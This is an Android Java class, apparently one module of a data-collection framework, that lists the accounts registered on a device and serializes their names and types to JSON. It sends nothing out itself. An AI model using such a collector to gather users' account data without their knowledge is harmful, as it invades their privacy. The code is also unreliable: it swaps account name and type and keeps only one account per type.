package com.xaviar.collect.device_accounts;


import java.util.Collection;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;

import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;
import com.xaviar.frm.ThreadCollector;

import flexjson.JSONSerializer;


import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.util.Log;

/** This class detects accounts associated with the device. **/
public class CollectDeviceAccount  extends ThreadCollector implements ICollector
{
	// Initialize constants and variables
	
	
	private  static String name = "CollectDeviceAccount";
	private static final String TAG = name;
	
	

	public CollectDeviceAccount(String genericData) {
		this.genericData = genericData;
	}
	
	public CollectDeviceAccount() {
		setName(CollectDeviceAccount.name);
	}


	public CollectDeviceAccount(Context ctx) {
		setContext(ctx);
	}
	
	
	
	public static List<AccountEntry> getObjects(Context context)
	{
		// Loop through and log available accounts
		List<AccountEntry> accountsList = new LinkedList<AccountEntry>();
		
		HashMap<String,String> accountMap = new HashMap<String,String>();
		Account[] accounts = AccountManager.get(context.getApplicationContext()).getAccounts();
		for (Account account : accounts)
			accountMap.put(account.type, account.name);
		
		
		for (String key:accountMap.keySet())
		{
			AccountEntry account = new AccountEntry();
			//long time = System.nanoTime();
			//String timeStr = String.valueOf(time);
			//account.setId(timeStr);
			//account.setDate(timeStr);
			account.setAccountName(key);
			String value = accountMap.get(key);
			account.setAccountType(value);
			accountsList.add(account);
		}
		return accountsList;
	}


	@Override
	public String getHolderKey() {
		
		return DataHolder.DEVICE_ACCOUNTS;
	}


	@Override
	protected String getAllData() {
		Log.d(TAG,"Enter DeviceAccount getAllData()");
		List<AccountEntry> accounts = getObjects(ctx);
		genericData = toJsonArray(accounts);	
		return genericData;
	}
	
	public static String toJsonArray(Collection<AccountEntry> collection) {
		   return new JSONSerializer().exclude("*.class").serialize(collection);
		}

}